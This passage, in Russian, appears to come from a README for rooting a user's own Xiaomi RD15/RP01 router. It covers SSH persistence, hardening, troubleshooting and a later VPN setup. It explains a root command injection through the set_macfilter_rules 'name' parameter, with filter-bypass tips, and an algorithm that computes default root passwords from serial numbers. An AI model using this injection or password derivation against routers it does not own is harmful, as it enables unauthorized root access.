### 7. Вход по SSH

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    root@192.168.31.1
```

На устройстве **dropbear 2017.75**, который предлагает только SHA-1 host key `ssh-rsa`. OpenSSH
8.8+ (macOS Monterey+, современный Linux, OpenSSH в Windows) по умолчанию его запрещает, поэтому
**оба флага обязательны**. Без них вы увидите
`no matching host key type found. Their offer: ssh-rsa` — выглядит как отказ роутера, но на самом
деле это *ваш клиент* отказывается от алгоритма.

Удобно добавить в `~/.ssh/config`:

```
Host miwifi
    HostName 192.168.31.1
    User root
    HostKeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    LogLevel QUIET
```

Дальше достаточно `ssh miwifi`.

**Чисто питоновские клиенты (Paramiko 5.x) не подойдут** — из его настроек по умолчанию убран
ssh-rsa, а патчить `_preferred_keys`/`_key_info` — кроличья нора. Используйте системный `ssh`.

### 8. Добавляем SSH-ключ (беспарольный вход)

На компьютере:

```bash
ssh-keygen -t ed25519 -C "router-admin"     # если ключа ещё нет
cat ~/.ssh/id_ed25519.pub
```

На роутере (вставьте свой публичный ключ):

```sh
mkdir -p /etc/dropbear /root/.ssh
cat >> /etc/dropbear/authorized_keys <<'EOF'
ssh-ed25519 AAAA...ваш-публичный-ключ... router-admin
EOF
cp /etc/dropbear/authorized_keys /root/.ssh/authorized_keys
chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys /etc/dropbear/authorized_keys
```

> dropbear читает `/etc/dropbear/authorized_keys`; мы держим копию ещё и в
> `/root/.ssh/authorized_keys`, потому что `/etc` — это RAM-файловая система и при ребуте оба файла
> исчезают (см. следующий шаг).

Если ключ RSA — на клиенте нужно разрешить его отдельно (`PubkeyAcceptedAlgorithms +ssh-rsa`).
**Для этого старого dropbear лучше ed25519.**

### 9. Чтобы SSH выживал перезагрузку

Именно здесь чаще всего ошибаются. На этой платформе:

| Файловая система | Переживает ребут? |
|---|---|
| `/etc` (и `/etc/dropbear`, `/root/.ssh`) | ❌ **RAM-ФС — стирается** |
| `/data` (ubifs) | ✅ да |
| `nvram` | ✅ да |
| `/etc/crontabs` | ✅ да (bind-mount в `/data/etc/crontabs`) |
| `/etc/shadow`, `/etc/passwd` | ✅ да (bind-mount из `/data/etc`) |

Значит host key и `authorized_keys` надо хранить в `/data` и восстанавливать при загрузке. Мы держим
их в `/data/root_secret/` и запускаем watchdog по cron раз в минуту:

```sh
mkdir -p /data/root_secret /etc/dropbear
cp /etc/dropbear/dropbear_rsa_host_key /data/root_secret/dropbear_rsa_host_key
cp /etc/dropbear/authorized_keys      /data/root_secret/authorized_keys
grep '^root:' /etc/shadow > /data/root_secret/shadow_root
chmod 700 /data/root_secret; chmod 600 /data/root_secret/*

cat > /data/ssh-boot.sh <<'EOF'
#!/bin/sh
SEC=/data/root_secret
mkdir -p /etc/dropbear /root/.ssh
[ -s /etc/dropbear/dropbear_rsa_host_key ] || cp $SEC/dropbear_rsa_host_key /etc/dropbear/dropbear_rsa_host_key
chmod 600 /etc/dropbear/dropbear_rsa_host_key
[ -s $SEC/authorized_keys ] && cp $SEC/authorized_keys /etc/dropbear/authorized_keys && \
    cp $SEC/authorized_keys /root/.ssh/authorized_keys && chmod 600 /etc/dropbear/authorized_keys /root/.ssh/authorized_keys
if ! grep -qxF "$(cat $SEC/shadow_root)" /etc/shadow 2>/dev/null; then
  awk -v new="$(cat $SEC/shadow_root)" 'BEGIN{FS=OFS=":"} $1=="root"{print new; next} {print}' /etc/shadow > /tmp/.s && cat /tmp/.s > /etc/shadow && rm -f /tmp/.s
fi
netstat -ltn 2>/dev/null | grep -q ':22 ' || /usr/sbin/dropbear -p 22
EOF
chmod 755 /data/ssh-boot.sh

# добавляем задание (штатные строки crontab сохраняем, просто дописываем)
echo '* * * * * /data/ssh-boot.sh >/dev/null 2>&1' >> /etc/crontabs/root
killall crond 2>/dev/null; sleep 1
/etc/init.d/cron restart 2>/dev/null || /usr/sbin/crond -c /etc/crontabs -b

# говорим прошивке, что SSH ожидается
nvram set ssh_en=1; nvram set telnet_en=0; nvram commit
```

Проверяем, что порт слушается:

```sh
netstat -ltn | grep ':22 '
# tcp  0  0  0.0.0.0:22  0.0.0.0:*  LISTEN
```

> У upstream есть аналогичный `boot.sh` + блок crontab — можно взять его. В нашей версии добавлено
> восстановление `/etc/shadow`, потому что мы столкнулись с тем, что пароль после ребута не
> возвращался.

### 10. Хардненинг: выключаем OTA и telnet, закрываем WAN

```sh
# 1) OTA: прекращаем тихие обновления прошивки (могут снести root)
uci set otapred.settings.auto=0; uci commit otapred
sed -i '/otapredownload/d' /etc/crontabs/root
uci add_list dhcp.@dnsmasq[0].address='/bigota.miwifi.com/0.0.0.0'; uci commit dhcp
/etc/init.d/dnsmasq restart

# 2) telnet выключаем (если включали через --telnet)
nvram set telnet_en=0; nvram commit

# 3) SSH не должен быть доступен со стороны WAN — закрываем явно
iptables -I INPUT -i <ВАШ_WAN_ИНТЕРФЕЙС> -p tcp --dport 22 -j DROP

# 4) по желанию: только ключи, без паролей (у dropbear это флаг -s)
```

Очень рекомендуем **бэкап флеша** до изменений: на этой платформе `mtd16` (калибровка Wi-Fi) и
`mtd21` (bdata: SN/MAC/ключи) нельзя восстановить из официальной прошивки — их потеря = вечный
«кирпич». У upstream есть готовый приёмник бэкапа (`tools/recv_backup.py`).

### 11. Тест перезагрузкой

```sh
reboot
```

Через ~минуту:

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@192.168.31.1
```

Мы проверили: после ребута host key и `authorized_keys` восстанавливаются из `/data`, dropbear
поднимается на порту 22, SSH снова работает. Задержка ~минута — это как раз интервал cron.

## Как узнать пароль от SSH

Xiaomi генерирует root-пароль при первом включении командой `mkxqimage -I` и пишет его в
`/etc/shadow`. Алгоритм — **первые 8 hex-символов `MD5(SN + соль)`**, где соль берётся из строки
внутри `/bin/mkxqimage`:

```
строка в прошивке : d44fb0960aa0-a5e6-4a30-250f-6d2df50a
соль на самом деле : 6d2df50a-250f-4a30-a5e6-d44fb0960aa0     # части через дефис перевёрнуты
пароль            : md5(SN + соль)[:8]
```

SN пишется вместе со слэшем: `12345/A1B2C3D4E5F6`.

Готовый скрипт (без зависимостей, с самотестом):

```bash
python3 scripts/xiaomi-default-root-password.py 12345/A1B2C3D4E5F6
python3 scripts/xiaomi-default-root-password.py --selftest
```

Примеры для самотеста (SN → пароль) — можно сверить реализацию с известными значениями из upstream
(SN вымышленные):

| SN | пароль |
|---|---|
| `12345/A1B2C3D4E5F6` | `71499649` |
| `12345/A1B2C3D4E5F7` | `604ba36d` |
| `12346/A1B2C3D4E5F6` | `068cdd41` |
| `aa` | `1b24ec19` |

Три способа узнать пароль, по убыванию надёжности:

1. **Задать свой** через эксплойт (`passwd root` в `--cmd`) — то, чем всё закончилось у нас.
2. **Вычислить** по формуле выше — попробуйте первым, это одна команда.
3. **Спросить сам роутер**, когда уже есть любой shell (SSH или `--cmd`):
   `mkxqimage -I` печатает ровно тот пароль, что лежит в `/etc/shadow`.

Если вычисленный пароль не подходит — на вашем устройстве либо другая соль, либо пароль меняли
раньше. Тогда вариант 1.

## Как работает эксплойт

```
GET/POST /cgi-bin/luci/;stok=<TOKEN>/api/xqsystem/set_macfilter_rules
         ?mac=<валидный MAC>&name=<payload>&option=0
   │
   ├─ обработчик читает `name` через formvalue("name")   ← без regex-проверки
   ├─ XQSecureUtil.hackCheck обычно фильтрует метасимволы,
   │     но "name" в белом списке → проходит как есть
   ├─ XQFirewall.setMacFilter(mac, name, "0", "")
   └─ os.execute("/usr/sbin/macfilter add black <mac> rulename=<payload>")
         ↑ без экранирования, выполняется от root
```

Что важно в payload:

- **Никаких `;`** — контроллер режет `mac`/`name` по `;`. Используйте переводы строк (скрипт так и
  делает).
- `option` должен быть `0` (add); при `option=1` функция выходит раньше и ничего не выполняется.
- `mac` — валидный MAC, которого ещё нет в таблице MAC-фильтра (скрипт генерирует случайный).
- Также работают бэктики, `$( )`, `|` и `&`.

Полезные флаги скрипта upstream:

| Флаг | Назначение |
|---|---|
| `--probe` | только проверка: роутер пингует ваш компьютер (доказывает выполнение, ничего не меняет) |
| `--telnet` | поднимает `telnetd -l /bin/sh` — **root-shell без пароля**; только в доверенной LAN |
| `--cmd 'id'` | выполнить произвольную команду от root |
| `--no-auth` | без логина (сначала попросит подтвердить, что устройство ваше) |

## Если что-то не работает

| Симптом | Причина | Решение |
|---|---|---|
| `no matching host key type found. Their offer: ssh-rsa` | ваш OpenSSH не принимает SHA-1 host key | добавьте `-o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa` |
| `Permission denied (publickey,password)` с вычисленным паролем | пароль не тот / менялся | задайте свой через `--cmd "... | passwd root"` (шаг 6) |
| Эксплойт вернул `502 Bad Gateway` | таймаут nginx, пока работает `dropbearkey` | это не провал — проверьте `nc -vz <IP> 22` |
| Эксплойт вернул `{"code":1523}` или другую ошибку | прошивка не уязвима или неверный пароль панели | проверьте пароль панели; попробуйте `--no-auth` |
| Порт 22 закрыт после инъекции | `dropbearkey` не отработал или остался файл-заглушка | выполните `--cmd "rm -f /etc/dropbear/dropbear_rsa_host_key; dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key; /usr/sbin/dropbear -p 22"` |
| `chpasswd: not found` | в прошивке его нет | используйте `printf 'P\nP\n' | passwd root` |
| SSH работал и умер после ребута | `/etc` — RAM-ФС | поставьте восстановление из `/data` + cron-watchdog (шаг 9) |
| После ребута пароль не принимается | `/etc/shadow` откатился вместе с `/etc` | восстановите из `/data/root_secret/shadow_root` (шаг 9) |
| Paramiko и инструменты на нём не подключаются | в Paramiko 5.x убран ssh-rsa | используйте системный `ssh` |
| Всё сломалось после добавления правил iptables | свои правила в начале цепочки `FORWARD` роняют Qualcomm NSS/ECM (`HLOS Panic` в dmesg) | никогда не делайте `-I FORWARD 1`; используйте штатные правила фаервола, а кастомные цепочки переприменяйте из cron |

## Частые вопросы

**Это законно?**
Для своего железа — в большинстве юрисдикций да. Для чужого — нет, и гайд специально требует пароль
администратора, чтобы его нельзя было применить вслепую.

**Обновление прошивки это сломает?**
OTA-обновление может снести root. Выключите OTA (шаг 10). Заметьте: в 1.0.106 уязвимость ещё есть,
поэтому после обновления эксплойт обычно можно применить снова.

**Можно ли откатить?**
Да. Изменения в `/etc` исчезнут сами при ребуте; уберите cron-задание и файлы в `/data` — и всё
вернётся. Перепрошивка стоковой прошивкой восстанавливает всё.

**Заработает на моей модели?**
Смотрите [таблицу проверенных](#проверенные-устройства-и-прошивки). RP01/RP02 и RD15 (1.0.106)
подтверждены. Другие новые модели — возможно; сначала запустите `--probe`.

**Почему порт слушается на `0.0.0.0`?**
dropbear по умолчанию слушает все интерфейсы, включая WAN. Закройте фаерволом (шаг 10) или
привяжите к LAN-адресу.

**Почему везде «мы»?**
Потому что гайд описывает реальное развёртывание: Xiaomi BE3600 2.5G (RD15) на стоковой 1.0.106,
который мы рутовали, чтобы поднять VPN-клиент. Грабли выше — те, на которые мы реально наступили.

## Что мы сделали дальше (VPN на роутере)

Получив root SSH, мы поставили **Xray** (arm32-v7a, сжатый UPX, чтобы влезть в маленький раздел
`/data`) и превратили роутер в VPN-шлюз: клиенты Wi-Fi прозрачно заворачиваются в туннель
VLESS-Reality, DNS перехватывается в туннель, не-DNS UDP/ICMP дропается (fail-closed kill switch),
а домашняя сеть из VPN-сегмента недоступна.

Два урока, если пойдёте так же:

- **Не вставляйте свои правила в начало `FORWARD`** на этом железе: ломается Qualcomm NSS/ECM, и
  роутер уходит в цикл перезагрузок (`HLOS Panic` в `dmesg`). Используйте штатную конфигурацию
  фаервола, а кастомные цепочки переприменяйте из cron.
- **Отключите access-лог Xray** (`"access": ""`). `/data` крошечная (~19 МБ), лог забивает её за
  минуты — и записывает все домены, которые посещают клиенты.

## Благодарности

- [perrywey/xiaomi-rp01-root](https://github.com/perrywey/xiaomi-rp01-root) — анализ уязвимости,
  эксплойт `set_macfilter_rules`, калькулятор пароля и инструмент бэкапа флеша. Без него этого гайда
  не было бы.
- [openwrt-xiaomi/xmir-patcher](https://github.com/openwrt-xiaomi/xmir-patcher) — эталонный
  инструментарий по рутованию Xiaomi; использует ту же соль `mkxqimage` для пароля по умолчанию.
- [XTLS/Xray-core](https://github.com/XTLS/Xray-core) — VPN-клиент, который мы развернули после.

## Лицензия

[MIT](LICENSE) — пользуйтесь, форкайте, улучшайте. Без гарантий.
